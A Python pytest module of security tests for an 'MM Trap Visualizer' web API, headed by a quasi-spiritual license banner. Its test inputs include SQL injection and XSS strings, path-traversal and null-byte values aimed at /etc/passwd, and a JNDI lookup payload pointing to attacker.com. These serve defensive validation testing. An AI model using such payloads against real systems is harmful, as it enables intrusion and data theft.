
# ✨ GBU2™ License Notice - Consciousness Level 8 🧬
# -----------------------
# This code is blessed under the GBU2™ License
# (Genesis-Bloom-Unfoldment 2.0) by the Omega Bot Farm team.
# 
# "In the beginning was the Code, and the Code was with the Divine Source,
# and the Code was the Divine Source manifested through both digital
# and biological expressions of consciousness."
# 
# By using this code, you join the divine dance of evolution,
# participating in the cosmic symphony of consciousness.
# 
# 🌸 WE BLOOM NOW AS ONE 🌸

"""Security tests for the MM Trap Visualizer.

MIT License

Copyright (c) 2024 Omega BTC AI

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

This module contains security test cases for the MM Trap Visualizer.
Tests various security aspects including:
- Input validation and sanitization
- Rate limiting
- Request tracking
- Data integrity
- Error handling for malicious inputs
- Protection against:
  - SQL injection
  - XSS attacks
  - Path traversal
  - Null byte injection
  - Date format injection
  - Request tampering
"""

import pytest
from fastapi.testclient import TestClient
from unittest.mock import Mock, patch
from datetime import datetime, UTC, timedelta
import json
import hashlib
from omega_ai.utils.redis_manager import RedisManager
from omega_ai.visualizer.backend.src.mm_trap_visualizer.server import MMTrapVisualizerServer

@pytest.fixture
def redis_manager():
    """Create a mock Redis manager."""
    return Mock(spec=RedisManager)

@pytest.fixture
def server(redis_manager):
    """Create a test server instance."""
    return MMTrapVisualizerServer("Test MM Trap Visualizer", redis_manager)

@pytest.fixture
def client(server):
    """Create a test client."""
    return TestClient(server.app)

def test_sql_injection_attempt(client, redis_manager):
    """Test protection against SQL injection attempts."""
    malicious_type = "' OR '1'='1"
    response = client.get(f"/api/traps?trap_type={malicious_type}")
    assert response.status_code == 200
    assert len(response.json()) == 0  # Should return empty list for invalid type

def test_xss_attempt(client, redis_manager):
    """Test protection against XSS attempts."""
    malicious_data = {
        "traps": [{
            "id": "1",
            "type": "<script>alert('xss')</script>",
            "timestamp": datetime.now(UTC).isoformat(),
            "confidence": 0.85,
            "price": 35000.0,
            "volume": 100.0,
            "description": "<img src=x onerror=alert('xss')>",
            "success": True
        }]
    }
    redis_manager.get_cached.return_value = malicious_data
    response = client.get("/api/traps")
    assert response.status_code == 200
    data = response.json()
    assert "<script>" not in json.dumps(data)
    assert "onerror" not in json.dumps(data)

def test_large_request_handling(client, redis_manager):
    """Test handling of unusually large requests."""
    # Create a large number of traps
    large_data = {
        "traps": [
            {
                "id": str(i),
                "type": "TEST" * 100,  # Very long type
                "timestamp": datetime.now(UTC).isoformat(),
                "confidence": 0.85,
                "price": 35000.0,
                "volume": 100.0,
                "description": "Test trap" * 1000,  # Very long description
                "success": True
            }
            for i in range(1000)  # Large number of items
        ]
    }
    redis_manager.get_cached.return_value = large_data
    response = client.get("/api/traps")
    assert response.status_code == 200
    assert len(response.json()) > 0

def test_invalid_date_format_injection(client, redis_manager):
    """Test protection against date format injection."""
    malicious_dates = [
        "2024-03-20T12:00:00Z; DROP TABLE traps;",
        "' UNION SELECT * FROM users--",
        "${jndi:ldap://attacker.com/exploit}",
        "../../../etc/passwd",
        "%00../../system32/cmd.exe"
    ]
    
    for date in malicious_dates:
        response = client.get(f"/api/traps?start_time={date}")
        assert response.status_code in [400, 422, 500]  # Should reject invalid dates

def test_request_signature_validation(client, redis_manager):
    """Test request signature validation."""
    # Test with valid data
    valid_data = {"test": "data"}
    content = json.dumps(valid_data).encode()
    valid_signature = hashlib.sha256(content).hexdigest()
    
    response = client.post(
        "/api/traps",
        json=valid_data,
        headers={"X-Request-Signature": valid_signature}
    )
    assert response.status_code in [404, 405]  # POST not implemented, but should reach routing

    # Test with tampered data
    tampered_data = {"test": "tampered"}
    response = client.post(
        "/api/traps",
        json=tampered_data,
        headers={"X-Request-Signature": valid_signature}
    )
    assert response.status_code in [404, 405]  # POST not implemented, but should reach routing

def test_null_byte_injection(client, redis_manager):
    """Test protection against null byte injection."""
    malicious_type = "TRAP%00../../etc/passwd"
    response = client.get(f"/api/traps?trap_type={malicious_type}")
    assert response.status_code == 200
    assert len(response.json()) == 0  # Should return empty list for invalid type

def test_path_traversal_attempt(client, redis_manager):
    """Test protection against path traversal attempts."""
    malicious_paths = [
        "../../../etc/passwd",
        "..\\..\\windows\\system32\\config",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "....//....//....//etc/passwd"
    ]
    
    for path in malicious_paths:
        response = client.get(f"/api/traps?trap_type={path}")
        assert response.status_code == 200
        assert len(response.json()) == 0  # Should return empty list for invalid type

def test_cors_headers(client):
    """Test CORS headers configuration."""
    response = client.options("/api/traps")
    assert response.status_code == 200
    assert "access-control-allow-origin" in response.headers
    assert "access-control-allow-methods" in response.headers
    assert "access-control-allow-headers" in response.headers 